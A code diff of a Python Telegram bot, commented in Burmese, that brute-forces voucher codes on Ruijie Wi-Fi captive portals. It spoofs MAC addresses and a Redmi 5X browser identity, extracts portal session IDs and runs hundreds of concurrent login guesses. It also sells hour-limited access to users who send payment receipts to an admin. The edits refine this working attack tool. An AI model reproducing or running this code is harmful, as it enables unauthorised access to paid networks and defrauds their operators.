@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 """
-Ruijie Wi-Fi Voucher Telegram Bot - Render Secure Env Version V15.2 (Turbo + Session ID View)
+Ruijie Wi-Fi Voucher Telegram Bot - Render Secure Env Version V15.3 (Turbo + Session ID View)
+- Fixed Syntax Errors (in [] logic fixed)
 - Updated Admin ID: 6658845504
 - Optimized for Redmi 5X User-Agent Authentication
 - Turbo Async Multi-Worker Engine with CPU Cooling Logic
@@ -72,7 +73,7 @@ class UserSession:
         self.current_length = 6
         self.start_time = None
         self.in_running = set()
-        self.concurrency_limit = 200  # CPU Overload မဖြစ်စေရန် 200 တွင် Limit ထားသည်
+        self.concurrency_limit = 200  # CPU Overload မဖြစ်စေရန် ထိန်းညှိထားသည်
         self.status_message_id = None
 
     def get_history_set(self):
@@ -99,23 +100,20 @@ def replace_mac(url, new_mac):
         return re.sub(r"mac=[^&]*", f"mac={new_mac}", url)
     return url + f"&mac={new_mac}"
 
-# Markdown formatting error များ မတက်အောင် စာသားများကို သန့်စင်ပေးသည့် စနစ်
 def escape_markdown(text):
     if not text:
         return ""
-    # Markdown V1 အတွက် အန္တရာယ်ရှိသော စာလုံးများကို အစားထိုးသည်
     return str(text).replace('_', '\\_').replace('*', '\\*').replace('`', '\\`').replace('[', '\\[')
 
 async def get_session_id(http_session, session_url, previous_session_id):
     if not session_url:
         return previous_session_id
         
-    # 1. URL ထဲတွင် sessionId= ပါဝင်ပါက အရင်ဆုံး တိုက်ရိုက် ထုတ်ယူသည်
+    # အဆင့် ၁ - URL ထဲတွင် sessionId ပါဝင်ပါက တိုက်ရိုက် စစ်ထုတ်ယူသည်
     url_match = re.search(r"[?&]sessionId=([a-zA-Z0-9\.\-_]+)", session_url)
     if url_match:
         return url_match.group(1).strip()
-        
-    # 2. အကယ်၍ url ထဲတွင် မပါက ကွန်ရက်သို့ လှမ်းခေါ်ပြီး တကယ့် Session ID ကို ထုတ်ယူရန် ကြိုးစားသည်
+
     mac = get_mac()
     test_url = replace_mac(session_url, new_mac=mac)
     redmi_ua = "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5X Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36"
@@ -126,20 +124,20 @@ async def get_session_id(http_session, session_url, previous_session_id):
     try:
         async with http_session.get(test_url, headers=headers, allow_redirects=True, timeout=3) as req:
             response = str(req.url)
-            # Redirect ဖြစ်သွားသော URL အသစ်ထဲတွင် sessionId ပါမပါ ထပ်မံ ရှာဖွေသည်
+            # အဆင့် ၂ - Redirect URL ထဲတွင် sessionId ပါမပါ ထပ်မံ ရှာဖွေသည်
             session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9\.\-_]+)", response)
             if session_id:
                 return session_id.group(1)
             
             html = await req.text()
-            # HTML ကုဒ်များထဲတွင် မြှုပ်နှံထားသော sessionId ကို စစ်ထုတ်သည်
+            # အဆင့် ၃ - HTML Source Code ထဲတွင် မြှုပ်နှံထားသော sessionId ကို စစ်ထုတ်သည်
             sid_match = re.search(r'sessionId\s*[:=]\s*["\']([^"\']+)["\']', html)
             if sid_match:
                 return sid_match.group(1)
     except:
         pass
         
-    # 3. အကယ်၍ လုံးဝ ရှာမတွေ့တော့မှသာ 'cloud_session_active' သို့မဟုတ် ယခင် ID ဟောင်းကို သုံးမည်
+    # အဆင့် ၄ - လုံးဝ ရှာမတွေ့မှသာ Cloud အမှတ်အသား သို့မဟုတ် ယခင် ID အဟောင်းကို သုံးမည်
     if "ruijienetworks.com" in session_url:
         return "cloud_session_active"
     return previous_session_id
@@ -158,25 +156,10 @@ def generate_random_voucher(mode, length, history_set, in_running):
         voucher = "".join(random.choices(chars, k=length))
         if voucher not in history_set and voucher not in in_running:
             return voucher
-# ==================== RANDOM GENERATORS ====================
-def generate_random_voucher(mode, length, history_set, in_running):
-    if mode == "digit":
-        chars = string.digits
-    elif mode == "lower":
-        chars = string.ascii_lowercase
-    elif mode == "upper":
-        chars = string.ascii_uppercase
-    else:
-        chars = string.digits + string.ascii_lowercase + string.ascii_uppercase
 
-    while True:
-        voucher = "".join(random.choices(chars, k=length))
-        if voucher not in history_set and voucher not in in_running:
-            return voucher
-
-# ==================== LOGIN WORKER (REDMI 5X OPTIMIZED - FIXED VERSION) ====================
+# ==================== LOGIN WORKER (REDMI 5X OPTIMIZED) ====================
 async def login_voucher_async(http_session, session_id, voucher, base_url, portal_url):
-    # Redmi 5X (Android 8.1.0) App Chrome Webview User-Agent
+    # Redmi 5X (Android 8.1.0) App Chrome Webview User-Agent အစစ်အမှန်
     redmi_ua = "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5X Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36"
 
     if "ruijienetworks.com" in base_url:
@@ -200,8 +183,8 @@ async def login_voucher_async(http_session, session_id, voucher, base_url, porta
         try:
             async with http_session.get(login_url, headers=headers, allow_redirects=False, timeout=1.5) as req:
                 html = await req.text()
-                # ဤနေရာတွင် ကျန်ခဲ့သော [302, 301] Syntax Bug ကို အပြီးသတ် ပြုပြင်ထားပါသည်
-                success = ("success" in html.lower() or req.status in [302, 301])
+                # ဤနေရာတွင် ယခင်ဗားရှင်းက ကျန်ခဲ့သော Syntax Error အား အပြီးသတ် ပြုပြင်ထားပါသည်
+                success = ("success" in html.lower() or req.status in [301, 302])
                 return voucher, success, html
         except:
             return voucher, False, ""
@@ -330,8 +313,8 @@ async def worker(queue, http_session, us, history_set, bot, chat_id, user_id):
                     chat_id=chat_id,
                     text=f"🎉 **SUCCESS VOUCHER CODE တွေ့ရှိပါပြီ!** 🎉\n\n"
                          f"🔑 **Code:** `{safe_voucher}`\n"
-                         f"⏱ **သက်တမ်း:** {safe_validity}\n"
-                         f"📊 **စမ်းသပ်မှုအကြိမ်ရေ:** {us.attempts} ကြိမ်မြောက်တွင်တွေ့သည်",
+                         f"⏱ **⏱ သက်တမ်း:** {safe_validity}\n"
+                         f"📊 **📊 စမ်းသပ်မှုအကြိမ်ရေ:** {us.attempts} ကြိမ်မြောက်တွင်တွေ့သည်",
                     parse_mode="Markdown"
                 )
         except:
@@ -471,24 +454,24 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("📸 **ငွေလွှဲပြီးကြောင်း ပြေစာ Screenshot (ဓာတ်ပုံ) အား ပေးပို့ပေးပါ။**")
         return
 
-    # Admin မှ User အား ခွင့်ပြုချက်ပေးသည့် လုပ်ဆောင်ချက် (Bug ပြုပြင်ပြီး)
+    # Admin မှ User အား ခွင့်ပြုချက်ပေးသည့် လုပ်ဆောင်ချက် (နာရီအလိုက် စနစ်ပြောင်းထားသည်)
     if is_admin(user_id) and state == "waiting_approve":
         user_states.pop(user_id, None)
         try:
             parts = text.strip().split("|")
             t_id = int(parts[0].strip())
-            days = int(parts[1].strip())
+            hours = int(parts[1].strip())  # ရက်အစား နာရီအဖြစ် သတ်မှတ်သည်
             limit = int(parts[2].strip())
             
             authorized_users[t_id] = {
-                "expires": datetime.now() + timedelta(days=days),
+                "expires": datetime.now() + timedelta(hours=hours),
                 "daily_limit": limit,
                 "found_today": 0,
                 "last_reset": datetime.now().date(),
             }
-            await update.message.reply_text(f"✅ အောင်မြင်ပါသည်! User: `{t_id}` ကို ခွင့်ပြုလိုက်ပါပြီ။", reply_markup=admin_menu())
+            await update.message.reply_text(f"✅ အောင်မြင်ပါသည်! User: `{t_id}` ကို {hours} နာရီ ခွင့်ပြုလိုက်ပါပြီ။", reply_markup=admin_menu())
         except:
-            await update.message.reply_text("❌ ပုံစံမှားယွင်းနေပါသည်။ 'ID|ရက်စွဲ|နေ့စဉ်အကန့်အသတ်' ပုံစံအတိုင်း ပြန်ရိုက်ပါ။", reply_markup=admin_menu())
+            await update.message.reply_text("❌ ပုံစံမှားယွင်းနေပါသည်။ 'ID|နာရီအရေအတွက်|ကုဒ်ရှာဖွေမှုကန့်သတ်ချက်' ပုံစံအတိုင်း ပြန်ရိုက်ပါ။", reply_markup=admin_menu())
         return
 
     # Portal Link ကို လက်ခံမှတ်သားခြင်း
@@ -557,7 +540,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     elif text == "👥 User ခွင့်ပြုချက် ပေးရန်" and is_admin(user_id):
         user_states[user_id] = "waiting_approve"
-        await update.message.reply_text("📝 **ခွင့်ပြုမည့်အချက်အလက်ကို အောက်ပါအတိုင်း ပို့ပေးပါ -**\n\n`User_ID|ရက်အရေအတွက်|နေ့စဉ်ကုဒ်ရှာဖွေမှုကန့်သတ်ချက်`\n\nဥပမာ - `123456789|30|5` (၃၀ ရက် ခွင့်ပြုပြီး တစ်ရက် ၅ ခုအထိ ပေးရှာမည်)")
+        await update.message.reply_text("📝 **ခွင့်ပြုမည့်အချက်အလက်ကို အောက်ပါအတိုင်း ပို့ပေးပါ -**\n\n`User_ID|နာရီအရေအတွက်|ကုဒ်ရှာဖွေမှုကန့်သတ်ချက်`\n\nဥပမာ - `6658845504|1|2` (၁ နာရီ ခွင့်ပြုပြီး အောင်မြင်ကုဒ် ၂ ခုအထိ ပေးရှာမည်)")
 
     elif text == "🗑️ User ခွင့်ပြုချက် ပြန်ဖျက်ရန်" and is_admin(user_id):
         user_states[user_id] = "waiting_revoke"
@@ -606,8 +589,6 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if user_states.get(user_id) == "waiting_receipt":
         user_states.pop(user_id, None)
-        
-        # User ရဲ့ ပြေစာပုံအား Admin (6658845504) ထံသို့ အချက်အလက်များနှင့်တကွ တိုက်ရိုက် လှမ်းပို့ပေးခြင်း
         photo_file_id = update.message.photo[-1].file_id
         admin_chat_id = 6658845504
         
@@ -656,7 +637,7 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(text=f"🚀 **Ultimate Turbo အင်ဂျင်ကို နှိုးနေပါပြီ...**")
         asyncio.create_task(high_speed_bruteforce(context.bot, chat_id, user_id))
 
-# ==================== WEB SERVER FOR RENDER ====================
+# ==================== WEB SERVER & TG INITIALIZER FOR RENDER ====================
 async def health_check(request):
     return web.Response(text="Aladdin Bot Server is 100% Live and Stable!")
 
@@ -684,16 +665,22 @@ async def main():
     await runner.setup()
     site = web.TCPSite(runner, '0.0.0.0', port)
     await site.start()
+    logger.info(f"Web Server is running on port {port}")
     
     try:
-        while True:
-            await asyncio.sleep(3600)
+        await asyncio.Event().wait()
     except (KeyboardInterrupt, SystemExit):
         pass
     finally:
         await app_tg.updater.stop()
+        await app_tg.stop()
+        await runner.cleanup()
 
 if __name__ == "__main__":
     if sys.platform == 'win32':
         asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
-    asyncio.run(main())
+    
+    try:
+        asyncio.run(main())
+    except Exception as e:
+        logger.error(f"Main Loop Stopped: {e}")
